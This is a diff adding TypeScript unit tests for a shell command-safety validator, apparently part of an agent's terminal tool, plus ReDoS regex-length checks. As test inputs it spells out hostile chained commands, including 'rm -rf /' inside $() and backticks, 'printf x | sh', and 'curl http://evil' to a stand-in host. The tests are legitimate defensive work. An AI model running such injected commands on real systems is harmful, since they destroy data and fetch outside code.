@@ -3,7 +3,7 @@ import { mkdtempSync, mkdirSync, symlinkSync, rmSync } from "node:fs"
 import { join } from "node:path"
 import { tmpdir } from "node:os"
 import type { StartInput } from "../../src/providers/provider.js"
-import { isCommandSafe, isCommandSafeArgv, isCwdAllowed, maybeWrapWithShell, isSubdirectory, isSubdirectoryCanonical, extractBaseCommandArgv } from "../../src/terminal/command-safety.js"
+import { isCommandSafe, isCommandSafeArgv, isCwdAllowed, maybeWrapWithShell, isSubdirectory, isSubdirectoryCanonical, extractBaseCommandArgv, validateRegexSafety, MAX_REGEX_LENGTH } from "../../src/terminal/command-safety.js"
 
 function createStartInput(overrides: Partial<StartInput> = {}): StartInput {
   return {
@@ -588,5 +588,134 @@ describe("isCwdAllowed — realpath canonicalize", () => {
     if (!result.ok) {
       expect(result.code).toBe("INVALID_CWD")
     }
+  })
+})
+
+describe("isCommandSafeArgv - shell chain bypass prevention", () => {
+  it(`echo ok; rm -rf /tmp/x 被拒绝（; 后含被拒命令 rm）`, () => {
+    const result = isCommandSafeArgv("echo ok; rm -rf /tmp/x", [])
+    expect(result.ok).toBe(false)
+    if (!result.ok) {
+      expect(result.code).toBe("UNSAFE_COMMAND")
+      expect(result.reason).toContain("rm")
+    }
+  })
+
+  it(`true && curl http://evil 被拒绝（&& 后含被拒命令 curl）`, () => {
+    const result = isCommandSafeArgv("true && curl http://evil", [])
+    expect(result.ok).toBe(false)
+    if (!result.ok) {
+      expect(result.code).toBe("UNSAFE_COMMAND")
+      expect(result.reason).toContain("curl")
+    }
+  })
+
+  it(`printf x | sh 被拒绝（| 后含被拒命令 sh）`, () => {
+    const result = isCommandSafeArgv("printf x | sh", [])
+    expect(result.ok).toBe(false)
+    if (!result.ok) {
+      expect(result.code).toBe("UNSAFE_COMMAND")
+      expect(result.reason).toContain("sh")
+    }
+  })
+
+  it(`echo hello（无 chain 操作符）仍然允许`, () => {
+    const result = isCommandSafeArgv("echo hello", [])
+    expect(result.ok).toBe(true)
+  })
+
+  it(`echo ok; ls -la（两个子命令均安全）仍然允许`, () => {
+    const result = isCommandSafeArgv("echo ok; ls -la", [])
+    expect(result.ok).toBe(true)
+  })
+
+  it(`ls || true 允许（两个子命令均安全）`, () => {
+    const result = isCommandSafeArgv("ls || true", [])
+    expect(result.ok).toBe(true)
+  })
+
+  it(`ls |& grep foo 允许（ls 和 grep 都安全）`, () => {
+    const result = isCommandSafeArgv("ls |& grep foo", [])
+    expect(result.ok).toBe(true)
+  })
+
+  it(`safe_cmd $(rm -rf /) 被拒绝（$() 中含被拒命令 rm）`, () => {
+    const result = isCommandSafeArgv("safe_cmd $(rm -rf /)", [])
+    expect(result.ok).toBe(false)
+    if (!result.ok) {
+      expect(result.code).toBe("UNSAFE_COMMAND")
+      expect(result.reason).toContain("rm")
+    }
+  })
+
+  it(`echo \`rm -rf /\` 被拒绝（反引号中含被拒命令 rm）`, () => {
+    const result = isCommandSafeArgv("echo `rm -rf /`", [])
+    expect(result.ok).toBe(false)
+    if (!result.ok) {
+      expect(result.code).toBe("UNSAFE_COMMAND")
+      expect(result.reason).toContain("rm")
+    }
+  })
+
+  it("riskyMode='ask' 时 chain 中的被拒命令返回 CONFIRMATION_REQUIRED", () => {
+    const result = isCommandSafeArgv("echo ok; rm -rf /", [], [], [], "ask")
+    expect(result.ok).toBe(false)
+    if (!result.ok) {
+      expect(result.code).toBe("CONFIRMATION_REQUIRED")
+    }
+  })
+
+  it("riskyMode='allow' 时 chain 中的被拒命令允许通过", () => {
+    const result = isCommandSafeArgv("echo ok; rm -rf /", [], [], [], "allow")
+    expect(result.ok).toBe(true)
+  })
+
+  it("allowedCommands 覆盖 chain 中的被拒命令", () => {
+    const result = isCommandSafeArgv("echo ok; rm -rf /", [], ["rm"])
+    expect(result.ok).toBe(true)
+  })
+})
+
+// ============================================================
+// validateRegexSafety — ReDoS 防护测试
+// ============================================================
+
+describe("validateRegexSafety", () => {
+  it("正常正则表达式通过验证", () => {
+    const result = validateRegexSafety("hello.*world")
+    expect(result.ok).toBe(true)
+  })
+
+  it("空正则表达式通过验证", () => {
+    const result = validateRegexSafety("")
+    expect(result.ok).toBe(true)
+  })
+
+  it("超过 MAX_REGEX_LENGTH 的正则表达式被拒绝", () => {
+    // 构造一个超长正则：501 个字符
+    const longPattern = "a".repeat(MAX_REGEX_LENGTH + 1)
+    const result = validateRegexSafety(longPattern)
+    expect(result.ok).toBe(false)
+    if (!result.ok) {
+      expect(result.reason).toContain(`${MAX_REGEX_LENGTH}`)
+      expect(result.reason).toContain(`${longPattern.length}`)
+    }
+  })
+
+  it("恰好等于 MAX_REGEX_LENGTH 的正则表达式通过验证", () => {
+    const exactPattern = "a".repeat(MAX_REGEX_LENGTH)
+    const result = validateRegexSafety(exactPattern)
+    expect(result.ok).toBe(true)
+  })
+
+  it("嵌套量词模式仍通过但仅触发 warn", () => {
+    // 嵌套量词是可疑模式，但不拒绝（减少误报）
+    const result = validateRegexSafety("(a+)+")
+    expect(result.ok).toBe(true)
+  })
+
+  it("复杂但安全的多选正则通过验证", () => {
+    const result = validateRegexSafety("(error|warn|info|debug)")
+    expect(result.ok).toBe(true)
   })
 })
